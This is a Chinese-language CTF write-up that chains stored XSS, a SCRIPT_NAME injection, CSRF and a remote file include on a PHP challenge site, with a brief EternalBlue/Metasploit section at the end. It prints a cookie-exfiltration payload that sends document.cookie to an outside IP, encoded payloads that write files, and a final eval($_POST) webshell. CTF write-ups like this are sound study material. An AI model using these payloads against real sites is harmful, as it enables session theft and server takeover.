## 小姐姐小姐姐，你听我说噢
感谢0kami老哥赞助的题目
### admin/view.php
有全部的源码。
先来看`admin/view.php`，这里可以了解到我们进不去的admin用户在做什么

<div align=center>
![wp6.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorly5xb6j30b502edfs.jpg)
</div>

这个页面是会3秒刷新一次，形成不断查看用户提交信息的行为。
之后会从数据库中原原本本读出用户提交的东西，显示在`<div>`标签内
截取一个在服务端形成的页面帮助理解标签构造(自己在本地也可以通过源码自己架构网站来实现查看)

<div align=center>
![wp7.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorn8iil5j30gx04ejr9.jpg)
</div>

可见这个地方是可以闭合标签形成XSS的，在`contact.php`中向admin用户发送payload
<div align=center>
![wp8.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqornu65xxj30p30a5753.jpg)
</div>

<div align=center>
![wp9.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqoro4akhgj30qe03iq2r.jpg)
</div>

尝试得到XSS
payload:`</div> <script>window.location.href='http://45.63.17.127:12345/cookie.asp?msg='+document.cookie</script> <div class="panel-body">`

<div align=center>
![wp10.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorofz8caj30ig058jrp.jpg)
</div>

失败
因为这里服务端**PHP.INI**设置了`session.cookie_httponly=On`
如果没有设置的情况
换一个payload如下(两个payload效果是一样的)：
```
</div> <script>var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://45.63.17.127:12345/a.php?joke='+document.cookie;</script> <div class="panel-body">
```

<div align=center>
![wp11.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqorov86w6j30if05mq3d.jpg)
</div>

至此我们可以发现提交意见框存在XSS漏洞，也就是我们可以在admin用户的网页内执行任意前端代码，包括让admin用户去访问我们制定的网站，除了无法获得用户的cookie。

>ps.获得cookie是xss其中最经典的用法，xss还有其他很多利用方法，比如构造虚假页面欺骗admin用户，但在这题目中都没有利用余地，admin用户，只是打开了网页自动一直在刷新查阅消息

### $_SERVER['SCRIPT_NAME']漏洞
继续搜寻其他漏洞
查看`index.php`源码，发现其他所有js/css都是用静态位置表示对应css,js位置

<div align=center>
![wp1.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorphwnzbj30ii03lmxh.jpg)
</div>

只有这个地方使用`$_SERVER['SCRIPT_NAME']`来获取当前网站位置

>**$_SERVER['SCPIPT_NAME']**在小于等于PHP5的版本里，会成为一个漏洞函数，它的触发还与APACHE的版本以及windows/linux系统有关。详情请见PHP漏洞函数分析一文。

进行测试

<div align=center>
![wp2.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorpo4b79j30ga09j3ym.jpg)
</div>

发现成功对返回的页面进行修改，尝试是否可以进一步利用。
payload:`"> </a> 1 <a  href="`
形成以下构造
```html
<a href="//index.php "> </a> 1 <a  href="" class="btn btn-lg btn-default">Current Page</a>
```

<div align=center>
![wp3.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorq32nyrj30ko05iglp.jpg)
</div>

payload:`"> </a> <script>alert(1)</script> <a  href= /`

<div align=center>
![wp4.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorqf44xyj30kz09x0td.jpg)
</div>

可以发现，形成**反弹XSS**
由于我们之前已经从`contact.php`得到了XSS，转而找其他的思路——**嵌入后端代码**

<div align=center>
![wp16.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqorqpj4ssj30wi03vdgk.jpg)
</div>

我们可以看见嵌入php代码是成功的，但是它只会返回到页面上，不会再后端执行。

此处必须说明关于 **$_SERVER['SCRIPT_NAME']** 的另一个要点：**只接受URL编码的值**
在该函数提取的URL中如果有特殊符号没有被URL加密过，就会直接舍弃全部

<div align=center>
![wp12.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrb3y58j30uz0750tn.jpg)
</div>

<div align=center>
![wp13.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorreey1yj30rp06gaat.jpg)
</div>

<div align=center>
![wp14.png](http://ww1.sinaimg.cn/large/006iKNp3gy1fqorrhdembj30vj07awfc.jpg)
</div>

<div align=center>
![wp15.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqorrkmyc0j30uv07tjs8.jpg)
</div>

还不接受burpsuite的+代替空格的URL编码

>ps.之前在hackbar中的数据实际上在发送前会被URL加密一次。
>经过hackbar发送的请求，自动URL加密GET参数，不自动URL加密POST参数


### 远程文件包含
`/admin/index.php` 有一处显而易见的远程文件包含
```php
include "http://localhost/".$_GET['path'];
```
此处**include**会执行一次访问 "http://localhost/".$_GET['path']的返回结果 中的PHP代码
而在访问本地地址的时候会再解析一次，也就是这句话会把path指定的页面解析两次。
无法理解的话，请参考[lfi与rfi](https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/)

但是由于之前有`check()`验证cookie。而我们不是admin用户，没法利用

同时这个页面，admin访问的话没有阻碍，即存在CSRF。

### 组合所有漏洞
我们知道可以通过联系admin用户的输入框控制admin界面的前端页面，此处可以嵌入`<img src= />`让admin用户自动访问任意网站，形成csrf
我们知道可以通过`/admin/index.php`的本地文件包含，包含执行对方服务器本地存在的代码。
我们知道可以在`index.php`中嵌入任意php代码

于是一套COMBO就连成了。
通过**输入框**控制admin用户去访问**/admin/index.php**。在其`参数path`中让**include包含**被我们注入php代码的漏洞页面**index.php/xxxxx**

### 构造payload
由于我们需要看到php执行的结果，把结果写入test.php文件夹中。
构造php代码
```php
<?php
fwrite(fopen('test.php','w+'),"<?php var_dump(glob('*'));?>");
?>
```
第二，由于上面我们发现**$_SERVER['SCPIPT_NAME']**注入php代码，需要保证php代码URL编码一次
计算我们此处payload需要URL编码的次数，顺便理清楚执行过程

```php
输入框内编码x次 加上 发送浏览器自动编码1次 
减去 服务器接受自动解码1次 
admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片
加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码1次
减去 服务器接受请求自动解码1次
因为PATH参数 远程include http://localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码
服务器 远程请求 服务器自己 
减去 服务器接受自动解码1次 
$_SERVER['SCPIPT_NAME'] 需要保证URL编码1次
```

所以得出 在输入框内 需要对php内容进行2次编码

**构造payload**

>初始payload:查看当前目录下所有文件，包括文件夹下内容
>`<img src=http://10.21.13.225/admin/index.php?path=index.php/<?php fwrite(fopen('test.php','w+'),"<?php var_dump(glob('*'));?>");?> />`

`<img />` 等内容在admin用户 前端界面显示，所以这里不用URL加密

>对于 path=index.php/ 之后  /> 之前，需要进入到最终 进行两次编码
>`<img src=http://10.21.13.225/admin/index.php?`
>`path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.`
>`php%2527%252C%2527w%252b%2527%2529%252C%2522%253C%253Fphp%2520var_dump%2528glob%2528%252`
>`7%252a%2527%2529%2529%253B%253F%253E%2522%2529%253B%253F%253E3%2520/>`（此处为了显示，有换行）


<div align=center>
![wp17.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqorrtn1j5j30qx02xgln.jpg)
</div>

成功，但是没有发现，既然可以写入文件，就写入web-shell吧
### 关于webshell-payload的细节分析
+ web-shell1：`fwrite(fopen('test.php','w+'),"<?php eval($_POST['cmd']);?>");`

但是`"<?php $_POST ?>"`双引号会对里面的 $_POST 进行解析,就没法原原本本写入
+ web-shell2：`fwrite(fopen('test.php','w+'),'<?php eval($_POST[\'cmd\']);?>');`

用单引号，内部对单引号要用\注释，如`\'`
但是在访问admin/index.phpURL解码一次，访问index.php时，URL编码的`\ -> %5C`会被解析成目录路径，从而失败
+ web-shell3：`fwrite(fopen('test.php','w+'),'<?php eval($_POST[cmd]);?>');`

考虑不使用`$_POST[\'cmd\']`使用`$_POST[cmd]`，这种写法虽然会NOICE提醒错误，但是也可以使用
测试可行，还有更好的
+ webshell_final：`fwrite(fopen('test.php','w+'),'<?php eval($_POST["cmd"]);?>');`

fwrite函数写入内容，外单引号，内双引号


>payload:
>`<img src=http://10.21.13.225/admin/index.php?path=index.php/12<?php fwrite(fopen('test.php','w+'),'<?php eval($_POST["cmd"]);?>');?>3 />`
>finally:
>`<img src=http://10.21.13.225/admin/index.php?`
>`path=index.php/12%253C%253Fphp%2520fwrite%2528fopen%2528%2527test.`
>`php%2527%252C%2527w%252b%2527%2529%252C%2527%253C%253Fphp%2520eval%2528%2524_POST`
>`%255B%2522cmd%2522%255D%2529%253B%253F%253E%2527%2529%253B%253F%253E3%2520/>`（此处为了显示，有换行）


<div align=center>
![wp18.png](http://ww4.sinaimg.cn/large/006iKNp3gy1fqortix4e5j30pn091t98.jpg)
</div>

接入菜刀/蚁剑，密码为shell中post参数

<div align=center>
![wp19.png](http://ww3.sinaimg.cn/large/006iKNp3gy1fqosh707b2j30cl09pmxc.jpg)
</div>

<div align=center>
![wp20.png](http://ww2.sinaimg.cn/large/006iKNp3gy1fqoslgjlsaj30al02swef.jpg)
</div>

### view.php的XSS攻击 为何与 include无法结合
也可能会有人思考到，view页面有XSS，向view页面写入php代码，在让admin用户去包含view页面这样。
如下payload


>`</div> <?php fwrite(fopen('test.php','w+'),'123');?> <div class="panel-body"> <img src=http://10.21.13.225/admin/index.php?path=admin/index.php?path=view/>`

事实是 不可以的。
admin用户去访问`/admin/index.php`会让服务器去访问`/admin/index.php?path=view`
但是服务器在访问`/admin/index.php`的时候不能通过`check验证`
所以就没法包含进view页面的php代码。

那如果admin用户是在服务端的浏览器查看的，可不可以呢，也是不可以的。
include 远程文件 是不能包含cookie的

## 永恒之蓝
以下writeup来自betamao:

### 发现
使用nmap扫描发现开了443端口，为windows服务器，还开了明显被永恒之蓝入侵的端口：

<div align=center>
![](http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg)
</div>

### 攻击
使用metasploit扫描果然存在漏洞：

<div align=center>
![](http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg)
</div>

直接攻击得到shell

<div align=center>
![](http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg)
</div>

## 后言
太特喵的累了....把能想到的问题一一尝试，全部解决了....也算是把白猪老哥的题弄清楚了....花了好长好长时间呜呜,溜了溜了qaq